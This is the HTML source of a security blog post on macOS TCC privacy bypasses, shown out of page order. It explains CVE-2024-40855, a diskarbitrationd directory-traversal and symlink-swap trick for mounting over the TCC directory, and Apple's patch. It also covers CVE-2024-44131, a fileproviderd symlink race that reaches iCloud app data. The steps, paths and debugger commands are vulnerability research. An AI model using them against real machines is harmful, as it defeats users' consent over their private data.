+&lt;p&gt;Since &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; returns &lt;code&gt;0&lt;/code&gt;, the check is passed.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Replace &lt;code&gt;starthere&lt;/code&gt; with a directory, run &lt;code&gt;diskarbitrationd&lt;/code&gt;, and verify the mount result&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;crab@see /tmp % rm starthere
+crab@see /tmp % mkdir starthere
+
+(lldb) c
+
+crab@see /tmp % mount
+...
+&lt;span class=&#34;hljs-regexp&#34;&gt;/dev/&lt;/span&gt;disk6s1 on &lt;span class=&#34;hljs-regexp&#34;&gt;/Users/&lt;/span&gt;crab&lt;span class=&#34;hljs-regexp&#34;&gt;/Library/&lt;/span&gt;Application Support/com.apple.TCC (apfs, local, nodev, nosuid, journaled, noowners, mounted by crab)&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Patch-Notes&#34;&gt;&lt;a href=&#34;#Patch-Notes&#34; class=&#34;headerlink&#34; title=&#34;Patch Notes&#34;&gt;&lt;/a&gt;Patch Notes&lt;/h2&gt;&lt;p&gt;Apple has fixed this vulnerability in macOS Sequoia 15.0.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( mntpath )
+{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( ( _argument1 &amp;amp; kDADiskMountOptionNoFollow ) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
+    {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( realpath( mntpath, path ) )
+        {
+            CFTypeRef mountpath = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; * ) path, &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;( path ), TRUE );
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( mountpath )
+            {
+                DARequestSetArgument2( request, CFURLGetString( mountpath ) );
+                CFRelease ( mountpath );
+            }
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+        {
+            status = kDAReturnBadArgument;
+        }
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;They now perform path resolution within &lt;code&gt;diskarbitrationd&lt;/code&gt; when handling requests instead of relying on the client side. This prevents attackers from injecting paths containing &lt;code&gt;../&lt;/code&gt; elements while maintaining the expected behavior for legitimate callers.&lt;/p&gt;
+&lt;p&gt;However, this validation logic is only applied if the &lt;code&gt;kDADiskMountOptionNoFollow&lt;/code&gt; flag is &lt;strong&gt;not&lt;/strong&gt; provided. If an attacker explicitly sets &lt;code&gt;kDADiskMountOptionNoFollow&lt;/code&gt;, the original attack would still be possible.&lt;/p&gt;
+&lt;p&gt;To fully mitigate this, Apple made an additional change to &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;status = sandbox_check_by_audit_token(_token, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file-mount&amp;quot;&lt;/span&gt;, SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL | SANDBOX_CHECK_CANONICAL, path);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &lt;code&gt;SANDBOX_CHECK_CANONICAL&lt;/code&gt; option was added to the validation process. With this, the sandbox check now &lt;strong&gt;automatically fails&lt;/strong&gt; if the path contains symbolic links or directory traversal elements (&lt;code&gt;../&lt;/code&gt;). This allows the system to block the attack at an earlier stage.&lt;/p&gt;
+&lt;h1 id=&#34;3-Other-Types-of-TCC-Bypass-Vulnerabilities&#34;&gt;&lt;a href=&#34;#3-Other-Types-of-TCC-Bypass-Vulnerabilities&#34; class=&#34;headerlink&#34; title=&#34;3. Other Types of TCC Bypass Vulnerabilities&#34;&gt;&lt;/a&gt;3. Other Types of TCC Bypass Vulnerabilities&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;CVE-2024-44131&#34;&gt;&lt;a href=&#34;#CVE-2024-44131&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-44131&#34;&gt;&lt;/a&gt;CVE-2024-44131&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;This is a TCC bypass vulnerability in File Provider, an extension that allows users to access files and folders synchronized with remote storage (such as iCloud) on macOS and iOS. The vulnerability arises due to a symlink validation flaw when the Files app and the fileproviderd system process handle file operations.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;Version-Information-1&#34;&gt;&lt;a href=&#34;#Version-Information-1&#34; class=&#34;headerlink&#34; title=&#34;Version Information&#34;&gt;&lt;/a&gt;&lt;strong&gt;Version Information&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;macOS : 5.3 &amp;#x2264; 14.7&lt;/p&gt;
+&lt;h3 id=&#34;File-Provider&#34;&gt;&lt;a href=&#34;#File-Provider&#34; class=&#34;headerlink&#34; title=&#34;File Provider?&#34;&gt;&lt;/a&gt;File Provider?&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;File Provider&lt;/strong&gt; is an extension that allows other apps to access files and folders synchronized with remote storage.&lt;/p&gt;
+&lt;p&gt;macOS and iOS use the &lt;strong&gt;Transparency, Consent, and Control (TCC)&lt;/strong&gt; mechanism to notify users when an application attempts to access sensitive information&amp;#x2014;such as &lt;strong&gt;photos, GPS location, contacts, etc.&lt;/strong&gt;&amp;#x2014;and allows them to approve or deny the request.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/documentation/fileprovider&#34;&gt;Apple Documentation on File Provider&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The vulnerability exploits a &lt;strong&gt;symlink attack&lt;/strong&gt; targeting the &lt;strong&gt;Files app&lt;/strong&gt; and the &lt;strong&gt;&lt;code&gt;fileproviderd&lt;/code&gt; system process&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;Key-Components-Involved-in-the-Attack&#34;&gt;&lt;a href=&#34;#Key-Components-Involved-in-the-Attack&#34; class=&#34;headerlink&#34; title=&#34;Key Components Involved in the Attack&#34;&gt;&lt;/a&gt;&lt;strong&gt;Key Components Involved in the Attack&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&amp;#x1F4C1; &lt;strong&gt;Files.app&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The default file explorer on iOS and macOS. It allows users to browse and manage files in iCloud Drive, local storage, external storage devices, and third-party cloud services (e.g., Google Drive, Dropbox).&lt;/p&gt;
+&lt;p&gt;&amp;#x2699;&amp;#xFE0F; &lt;strong&gt;fileproviderd&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A system process in macOS and iOS that manages the &lt;strong&gt;File Provider&lt;/strong&gt; extension. It plays a crucial role in handling file synchronization and access between the Files app and cloud storage.&lt;/p&gt;
+&lt;h3 id=&#34;How-the-Attack-Works&#34;&gt;&lt;a href=&#34;#How-the-Attack-Works&#34; class=&#34;headerlink&#34; title=&#34;How the Attack Works&#34;&gt;&lt;/a&gt;&lt;strong&gt;How the Attack Works&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;When a user moves or copies a file using &lt;strong&gt;Files.app&lt;/strong&gt;, a malicious app running in the background can intercept and manipulate the operation. The attacker &lt;strong&gt;exploits the high privileges of &lt;code&gt;fileproviderd&lt;/code&gt;&lt;/strong&gt; to interfere with file operations &lt;strong&gt;without triggering a TCC prompt (permission request window).&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Typically, mitigation techniques prevent attackers from exploiting &lt;strong&gt;symlink race conditions&lt;/strong&gt; or &lt;strong&gt;path traversal attacks&lt;/strong&gt; when privileged processes copy, move, or delete files. Most file operation APIs include checks to &lt;strong&gt;verify whether the source or destination is a symlink&lt;/strong&gt; and are designed to abort the operation if a symlink is detected.&lt;/p&gt;
+&lt;p&gt;However, in this vulnerability, attackers &lt;strong&gt;bypass the existing checks&lt;/strong&gt; by inserting a symlink &lt;strong&gt;one directory level above&lt;/strong&gt; the target file &lt;strong&gt;midway through the operation&lt;/strong&gt;, instead of placing a symlink directly at the final file path &lt;strong&gt;before&lt;/strong&gt; the operation starts.&lt;/p&gt;
+&lt;h3 id=&#34;Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques&#34;&gt;&lt;a href=&#34;#Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques&#34; class=&#34;headerlink&#34; title=&#34;Comparison of Traditional vs. New Symlink Attack Techniques&#34;&gt;&lt;/a&gt;&lt;strong&gt;Comparison of Traditional vs. New Symlink Attack Techniques&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Traditional Symlink Attack&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers place a &lt;strong&gt;symlink at the final file or directory level&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Security validation detects the symlink and blocks the attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CVE-2024-44131 Symlink Attack&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers insert a &lt;strong&gt;symlink at the parent directory level&lt;/strong&gt; &lt;em&gt;after&lt;/em&gt; the file copy has started.&lt;/li&gt;
+&lt;li&gt;Since &lt;strong&gt;previous checks only validated the final file/directory name&lt;/strong&gt;, this approach &lt;strong&gt;bypasses the security check&lt;/strong&gt; by altering the path mid-operation.&lt;/li&gt;
+&lt;li&gt;As a result, attackers can &lt;strong&gt;hijack files without triggering a TCC prompt&lt;/strong&gt; or &lt;strong&gt;copy files that require special privileges&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;Paths-Accessible-by-fileproviderd&#34;&gt;&lt;a href=&#34;#Paths-Accessible-by-fileproviderd&#34; class=&#34;headerlink&#34; title=&#34;Paths Accessible by fileproviderd&#34;&gt;&lt;/a&gt;&lt;strong&gt;Paths Accessible by &lt;code&gt;fileproviderd&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x1F4CD; &lt;strong&gt;Key Target Path&lt;/strong&gt; &lt;code&gt;/var/mobile/Library/Application Support/FileProvider/AccessControl.db&lt;/code&gt; This database stores a list of apps that have interacted with the Files app and the file system. Attackers can potentially exploit it for unauthorized access.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Examples-of-Sensitive-Data-Paths&#34;&gt;&lt;a href=&#34;#Examples-of-Sensitive-Data-Paths&#34; class=&#34;headerlink&#34; title=&#34;Examples of Sensitive Data Paths&#34;&gt;&lt;/a&gt;&lt;strong&gt;Examples of Sensitive Data Paths&lt;/strong&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Apple Pages backup documents&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/com~apple~Pages&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Files manually saved to iCloud Drive (including Downloads)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/com~apple~CloudDocs&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;WhatsApp backup data&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/57T9237FN3~net~whatsapp~WhatsApp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt; (&lt;em&gt;This path uses a fixed identifier instead of a UUID, making it predictable for attackers.&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;By exploiting this vulnerability, attackers can access and exfiltrate &lt;strong&gt;iCloud backup data&lt;/strong&gt; belonging to both first-party and third-party apps. They can do this by &lt;strong&gt;copying, moving, or deleting&lt;/strong&gt; files and directories under the main target data path: &amp;#x1F4C2; &lt;strong&gt;&lt;code&gt;/var/mobile/Library/Mobile Documents/&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;Ref&#34;&gt;&lt;a href=&#34;#Ref&#34; class=&#34;headerlink&#34; title=&#34;Ref&#34;&gt;&lt;/a&gt;Ref&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/&#34;&gt;https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://zeroclick.sh/blog/macos-tcc/&#34;&gt;https://zeroclick.sh/blog/macos-tcc/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses&#34;&gt;https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/&#34;&gt;https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.kandji.io/blog/macos-audit-story-part2&#34;&gt;https://www.kandji.io/blog/macos-audit-story-part2&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Research] MacOS TCC Bypass (en) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/TCC_Bypass.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Dreaming of becoming a future Apple picker, I&amp;#x2019;m back with another macOS vulnerability&amp;#x2014;this time, a TCC Bypass! &amp;#x1F34F;&lt;/p&gt;
+&lt;p&gt;&amp;#x1F517; &lt;strong&gt;Related post:&lt;/strong&gt; &lt;a href=&#34;https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/&#34;&gt;CVE-2024-44175 - macOS &lt;code&gt;diskarbitrationd&lt;/code&gt; Sandbox Escape&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;In my previous post, I covered a vulnerability in the &lt;code&gt;diskarbitrationd&lt;/code&gt; system daemon that allowed attackers to bypass the sandbox or elevate privileges through filesystem manipulation.&lt;/p&gt;
+&lt;p&gt;Today, we&amp;#x2019;re diving into &lt;strong&gt;CVE-2024-40855&lt;/strong&gt;, another flaw in &lt;code&gt;diskarbitrationd&lt;/code&gt; that not only &lt;strong&gt;escapes the sandbox&lt;/strong&gt; but also allows mounting into the user&amp;#x2019;s &lt;strong&gt;Transparency, Consent, and Control (TCC)&lt;/strong&gt; directory. This vulnerability exploits a &lt;strong&gt;Directory Traversal attack&lt;/strong&gt; in &lt;code&gt;diskarbitrationd&lt;/code&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;1-TCC-Bypass&#34;&gt;&lt;a href=&#34;#1-TCC-Bypass&#34; class=&#34;headerlink&#34; title=&#34;1. TCC Bypass?&#34;&gt;&lt;/a&gt;1. TCC Bypass?&lt;/h1&gt;&lt;p&gt;Transparency, Consent, and Control (TCC) is &lt;strong&gt;Apple&amp;#x2019;s security framework&lt;/strong&gt; that governs app permissions for accessing &lt;strong&gt;sensitive user data&lt;/strong&gt;. Users can manage these permissions via the &lt;code&gt;Settings&lt;/code&gt; app.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Ever seen a popup asking, &lt;em&gt;&amp;#x201C;Do you want to allow microphone access?&amp;#x201D;&lt;/em&gt;?&lt;/p&gt;
+&lt;p&gt;That&amp;#x2019;s TCC in action&amp;#x2014;macOS&amp;#x2019;s &lt;strong&gt;app permission management system&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;A &lt;strong&gt;TCC Bypass&lt;/strong&gt; occurs when an attacker gains unauthorized access to sensitive user data (e.g., photos, microphone, location) &lt;strong&gt;without the user&amp;#x2019;s consent&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;2-Vulnerability-Overview&#34;&gt;&lt;a href=&#34;#2-Vulnerability-Overview&#34; class=&#34;headerlink&#34; title=&#34;2. Vulnerability Overview&#34;&gt;&lt;/a&gt;2. Vulnerability Overview&lt;/h1&gt;&lt;h3 id=&#34;CVE-2024-40855&#34;&gt;&lt;a href=&#34;#CVE-2024-40855&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-40855&#34;&gt;&lt;/a&gt;CVE-2024-40855&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;A directory traversal vulnerability in diskarbitrationd, a macOS system daemon, allows an attacker to bypass TCC protections by mounting unauthorized paths.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;Version-Information&#34;&gt;&lt;a href=&#34;#Version-Information&#34; class=&#34;headerlink&#34; title=&#34;Version Information&#34;&gt;&lt;/a&gt;&lt;strong&gt;Version Information&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;macOS : 13.0 &amp;#x2264; 14.6&lt;/p&gt;
+&lt;h3 id=&#34;diskarbitrationd&#34;&gt;&lt;a href=&#34;#diskarbitrationd&#34; class=&#34;headerlink&#34; title=&#34;diskarbitrationd&#34;&gt;&lt;/a&gt;&lt;strong&gt;diskarbitrationd&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;diskarbitrationd&lt;/code&gt; daemon has three key characteristics:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Runs &lt;strong&gt;as root&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Accessible &lt;strong&gt;from within the sandbox&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Has the &lt;strong&gt;&lt;code&gt;com.apple.private.security.storage-exempt.heritable&lt;/code&gt;&lt;/strong&gt; attribute, effectively granting it &lt;strong&gt;Full Disk Access&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Because of these, Apple implements &lt;strong&gt;strict validation mechanisms&lt;/strong&gt; to prevent sandbox escapes and unauthorized mounting to TCC-protected directories.&lt;/p&gt;
+&lt;p&gt;Sandbox validation includes:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Mount Path Validation&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;The client-side logic checks for &lt;code&gt;../&lt;/code&gt; (directory traversal) and ensures &lt;strong&gt;path resolution&lt;/strong&gt; does not bypass security checks (e.g., via symlink attacks).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Sandbox Verification&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;diskarbitrationd&lt;/code&gt; calls &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; to determine if the requesting process has access to the specified files/directories.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kernel-Level Mount Validation&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;The kernel enforces additional restrictions on external mount requests, rejecting any paths containing symbolic links when the &lt;code&gt;k&lt;/code&gt; option is used.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These three layers of validation are supposed to prevent sandbox escapes and unauthorized TCC access.&lt;/p&gt;
+&lt;h3 id=&#34;&amp;#x1F525;-Bypassing-Client-Side-Mount-Path-Validation&#34;&gt;&lt;a href=&#34;#&amp;#x1F525;-Bypassing-Client-Side-Mount-Path-Validation&#34; class=&#34;headerlink&#34; title=&#34;&amp;#x1F525; Bypassing Client-Side Mount Path Validation&#34;&gt;&lt;/a&gt;&amp;#x1F525; Bypassing Client-Side Mount Path Validation&lt;/h3&gt;&lt;p&gt;The flaw lies in the &lt;strong&gt;first step&lt;/strong&gt;&amp;#x2014;Mount Path Validation.&lt;/p&gt;
+&lt;p&gt;This check happens &lt;strong&gt;on the client-side&lt;/strong&gt; within Apple&amp;#x2019;s &lt;code&gt;DiskArbitration&lt;/code&gt; framework, specifically in the function &lt;code&gt;DADiskMountWithArgumentsCommon&lt;/code&gt;. An attacker can &lt;strong&gt;completely bypass this validation&lt;/strong&gt; by skipping &lt;code&gt;DiskArbitration&lt;/code&gt; and calling &lt;code&gt;diskarbitrationd&lt;/code&gt; &lt;strong&gt;directly&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;By doing this, the attacker can:&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Pass a mount path containing &lt;code&gt;../&lt;/code&gt; elements&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Bypass sandbox checks&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x2705; &lt;strong&gt;Bypass symlink restrictions&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Here&amp;#x2019;s the relevant part of the &lt;code&gt;DADiskMountWithArgumentsCommon&lt;/code&gt; function:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__private_extern__ &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;DADiskMountWithArgumentsCommon&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;( DADiskRef disk,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               CFURLRef            path,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               DADiskMountOptions  options,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               DADiskMountCallback callback,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *              context,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               CFStringRef         arguments[],&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                               &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;                block )&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+...
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( path )
+    {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; * _path;
+        _path = ___CFURLCopyFileSystemRepresentation( path );
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( _path )
+        {
+            &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; name[MAXPATHLEN];
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( realpath( _path, name ) )
+            {
+                path = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; * ) name, &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;( name ), TRUE );
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+            {
+                CFRetain( path );
+            }
+            &lt;span class=&#34;hljs-built_in&#34;&gt;free&lt;/span&gt;( _path );
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+        {
+            CFRetain( path );
+        }
+    }
+    status = kDAReturnBadArgument;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( disk )
+    {
+        status = _DAAuthorize( _DADiskGetSession( disk ), _kDAAuthorizeOptionIsOwner, disk, _kDAAuthorizeRightMount );
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( status == kDAReturnSuccess )
+        {
+            status = __DAQueueRequest( _DADiskGetSession( disk ), _kDADiskMount, disk, options, path ? CFURLGetString( path ) : &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, argument, callback, context, block );
+        }
+    }
+...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In the code above, the &lt;code&gt;realpath&lt;/code&gt; and &lt;code&gt;CFURLCreateFromFileSystemRepresentation&lt;/code&gt; function calls are responsible for stripping &lt;code&gt;../&lt;/code&gt; elements. However, since this validation occurs on the client side, an attacker can completely bypass it by calling &lt;code&gt;diskarbitrationd&lt;/code&gt; directly. By skipping the &lt;code&gt;DiskArbitration&lt;/code&gt; framework and passing a path containing &lt;code&gt;../&lt;/code&gt; elements directly to &lt;code&gt;diskarbitrationd&lt;/code&gt;, it becomes possible to evade sandbox restrictions and mount a TCC-protected directory.&lt;/p&gt;
+&lt;p&gt;These functions sanitize paths &lt;strong&gt;only on the client side&lt;/strong&gt;. If an attacker &lt;strong&gt;calls &lt;code&gt;diskarbitrationd&lt;/code&gt; directly&lt;/strong&gt;, they can inject a &lt;code&gt;../&lt;/code&gt; traversal attack &lt;strong&gt;before validation occurs&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;Explain-1-Mounting-Library-Application-Support-com-apple-TCC&#34;&gt;&lt;a href=&#34;#Explain-1-Mounting-Library-Application-Support-com-apple-TCC&#34; class=&#34;headerlink&#34; title=&#34;Explain 1 : Mounting ~/Library/Application Support/com.apple.TCC&#34;&gt;&lt;/a&gt;Explain 1 : Mounting &lt;code&gt;~/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s walk through how to exploit this vulnerability to mount the user&amp;#x2019;s &lt;strong&gt;TCC directory&lt;/strong&gt; and modify &lt;code&gt;TCC.db&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 1: Call &lt;code&gt;DAMount&lt;/code&gt; with a Traversal Path&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We provide a crafted path with &lt;code&gt;../&lt;/code&gt; elements.&lt;/p&gt;
+&lt;p&gt;&amp;#x26A0;&amp;#xFE0F; &lt;strong&gt;Key Trick:&lt;/strong&gt; Ensure the client does not interpret the path before it reaches &lt;code&gt;diskarbitrationd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 2: Manipulate Symlinks During &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; Execution&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;1&amp;#xFE0F;&amp;#x20E3; Create a symbolic link&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/starthere -&amp;gt; /private/tmp/1/2/3&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;2&amp;#xFE0F;&amp;#x20E3; When &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; checks the path, the following &lt;strong&gt;unexpected transformation&lt;/strong&gt; occurs:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;3&amp;#xFE0F;&amp;#x20E3; Next, create a directory structure that &lt;strong&gt;mimics&lt;/strong&gt; the expected validation path:&lt;/p&gt;
